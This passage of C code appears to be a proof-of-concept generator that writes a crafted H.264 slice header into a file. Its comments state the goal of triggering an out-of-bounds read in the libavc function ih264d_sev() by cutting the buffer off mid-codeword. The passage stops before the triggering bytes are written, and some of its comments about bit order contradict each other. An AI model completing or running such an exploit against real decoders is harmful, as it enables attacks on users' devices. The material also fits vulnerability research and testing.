    // chroma_log2_weight_denom (ue(v)) = 0 -> '1'
    fputc(0x80, f);

    // no_output_of_prior_pics_flag = 0 (u(1))
    fputc(0x00, f);

    // long_term_reference_flag = 0 (u(1))
    fputc(0x00, f);

    // adaptive_ref_pic_marking_mode_flag = 0 (u(1))
    fputc(0x00, f);

    // Now we need to trigger the overread in ih264d_sev()
    // The parser will try to read a signed exp-Golomb value for delta_mv
    // We'll place a long zero-based codeword that requires more bits than available
    // The codeword for a large negative value starts with many zeros followed by a '1'
    // We'll write a single '1' bit followed by zeros to make the parser think
    // there's a large value, but the buffer ends before the codeword completes

    // Write a '1' bit (start of codeword) followed by zeros that will be read
